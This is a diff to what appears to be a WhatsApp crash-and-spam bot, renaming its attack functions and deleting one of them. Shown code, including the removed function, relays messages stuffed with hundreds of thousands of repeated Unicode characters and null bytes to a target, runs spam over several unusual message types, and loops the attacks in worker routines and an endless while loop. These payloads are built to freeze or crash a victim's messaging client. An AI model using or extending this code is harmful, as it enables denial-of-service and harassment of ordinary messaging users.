@@ -3521,7 +3521,7 @@ Status      : Success
             
             for (let i = 0; i < 1; i++) {
                 try {
-                    await VnXBulldo(sock, target);
+                    await VogueBuldo(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3595,7 +3595,7 @@ Status      : Success
             
             for (let i = 0; i < 5; i++) {
                 try {
-                    await AMZinvisiblespam(sock, target);
+                    await VogueSpamInvis(sock, target);
                     await sleep(1500)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -4192,7 +4192,7 @@ async function VnXNewStcDrainKouta1000Gb(sock, target, mention = true) {
   await sleep(1500);
 }
 
-async function AMZinvisiblespam(sock, target) {
+async function VogueSpamInvis(sock, target) {
   try {
     const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];    
     for (const x of type) {
@@ -4238,49 +4238,11 @@ async function AMZinvisiblespam(sock, target) {
       await new Promise(resolve => setTimeout(resolve, 1000));
     }
   } catch (err) {
-    await console.error(` Error pula wakk😹,itayo itayo🥲: ${err.message}`);
+    await console.error(`${err.message}`);
   }
 }
 
-async function VnXNewOneButtonsBlnk(sock, target) {
-  const VnXOneButton = [
-    {
-      buttonId: "VnX",
-      buttonText: {
-        displayText: "ꦽ".repeat(80000)
-      },
-      type: 1
-    }
-  ];
-
- const vnxbtns = {
-   buttonsMessage: {
-      contentText: "ꦾ".repeat(250000),
-      footerText: "\u0000".repeat(15000),
-      buttons: VnXOneButton,
-      headerType: 1
-    }
-  };
-   
-    const VnXblnksltter = {
-       newsletterAdminInviteMessage: {
-          newsletterJid: "120363321780343299@newsletter",
-          newsletterName: "Coba Kamu Pencet Chat Ini 🍁" + "ꦽꦾ".repeat(250000),
-          caption: "VnX Bng" + "ꦽꦾ".repeat(250000),
-          inviteExpiration: "9282682616283736",    
-       }
-    };
-  
-   await sock.relayMessage(target, VnXblnksltter, { 
-    participant: { jid: target } 
-  });
-    
-    await sock.relayMessage(target, vnxbtns, { 
-    participant: { jid: target } 
-  });
-}
-
-async function VnXBulldo(sock, target) {
+async function VogueBuldo(sock, target) {
  while (true) {
   const MsgNew = {
     groupStatusMessageV2: {
